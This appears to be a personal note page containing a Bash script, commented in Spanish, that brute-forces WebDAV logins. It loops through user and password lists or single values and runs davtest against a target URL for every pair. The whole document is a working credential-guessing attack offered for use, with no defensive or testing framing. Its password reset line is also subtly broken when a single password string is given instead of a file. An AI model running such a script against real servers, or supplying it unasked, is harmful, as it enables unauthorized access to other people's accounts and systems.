
---
- Tags: #Bashscript #Http #https #WebDAV 
- ---
```bash
#!/bin/bash

if [[ $# -ne 3 ]]; then
  echo "Uso: $0 <users|user> <passwords|password> <url_webdav>"
  exit 1
fi

USER_INPUT="$1"
PASS_INPUT="$2"
URL="$3"

# Abrimos descriptores
if [[ -f "$USER_INPUT" ]]; then
  exec 3< "$USER_INPUT"
else
  printf "%s\n" "$USER_INPUT" > /tmp/.user_tmp
  exec 3< /tmp/.user_tmp
fi

if [[ -f "$PASS_INPUT" ]]; then
  exec 4< "$PASS_INPUT"
else
  printf "%s\n" "$PASS_INPUT" > /tmp/.pass_tmp
  exec 4< /tmp/.pass_tmp
fi

# Bruteforce real
while read -r user <&3; do

  # Reiniciamos passwords en cada usuario
  exec 4< "$PASS_INPUT"

  while read -r pass <&4; do
    echo "[*] Probando $user:$pass"
    davtest -url "$URL" -u "$user" -p "$pass" 2>/dev/null
  done

done

echo "[+] Bruteforce terminado"


```